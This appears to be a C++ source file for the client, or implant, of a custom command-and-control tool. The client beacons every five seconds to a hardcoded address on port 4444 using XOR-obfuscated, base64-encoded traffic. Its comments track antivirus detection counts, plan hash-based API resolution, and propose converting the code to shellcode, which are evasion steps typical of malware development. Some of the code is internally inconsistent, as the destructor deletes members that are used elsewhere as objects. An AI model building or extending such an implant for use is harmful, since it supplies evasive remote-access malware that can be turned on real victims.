/* TODO:
 * x86_64-w64-mingw32-gcc -nostdlib -nostartfiles -s -Wl,--entry=main -Wl,--strip-all client.c -o client.exe
 * 
 * // Working flags below, 5/72
 * x86_64-w64-mingw32-gcc -s -Wl,--entry=main -Wl,--strip-all client.c -o client.exe 
 * */

// TODO: eventually convert to c code then asm then shell code?


#include "Client.h"
#include "ComponentFactory.h"
#include "TransportLayer.h"

#include <iostream>



Client::Client() :
	messageHandler_(),
	transportLayerPtr_(
		TransportLayerFactory::create(
		messageHandler_,
		"10.0.0.48",
		"4444",
		TransportLayerType::TCP,
		SerializerType::BINARY,
		EncoderType::BASE64,
		EncryptorType::XOR
		)
	)
{
	messageHandler_.setTransportLayer(*transportLayerPtr_);
}

Client::Client(
	const std::string& server,
	const std::string& port,
	TransportLayerType transportType,
	SerializerType serializerType,
	EncoderType encoderType,
	EncryptorType encryptorType)
	:
	messageHandler_(),
	transportLayerPtr_(
		TransportLayerFactory::create(
			messageHandler_,
			server,
			port,
			transportType,
			serializerType,
			encoderType,
			encryptorType)
	)
	/*
	, messageHandler_()
	, transportLayerFactory_()
	*/
{
	messageHandler_.setTransportLayer(*transportLayerPtr_);
}

Client::~Client()
{
	if (messageHandler_)
	{
		delete messageHandler_;
	}

	if (transportLayerFactory_)
	{
		delete transportLayerFactory_;
	}
}

bool Client::run()
{	
	//Config* config = loadConfig();
	//Config config = loadConfig();

	// 1. manually resolve apis
	/*
	TODO:
	would i be more effient to find the function/procedure names all at once for a single dll/module so i don't have
	to loop through the array of functions every single time?

	something like this:
	resolve_all_functions(dll_base, hashes, pointers, count);

	not sure if this is worth doing for dlls/modules tho

	*/

	__try
	{
		while (true)
		{
			if (!transportLayerPtr_->isConnected())
			{
				transportLayerPtr_->connect();
			}

			if (transportLayerPtr_->isConnected())
			{
				transportLayerPtr_->beacon();
			}
			std::cout << "before sleeping" << std::endl;
			Sleep(5000);
			std::cout << "after sleeping" << std::endl;
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		std::cout << "CRITICAL: Exception in main loop: 0x" << std::hex << GetExceptionCode() << std::dec << std::endl;
		// Try to reconnect or restart
		return false;
	}

	return false;
}

void Client::setup()
{
	messageHandler_ = new MessageHandler();
	transportLayerFactory_ = new TransportLayerFactory(*messageHandler_);
}
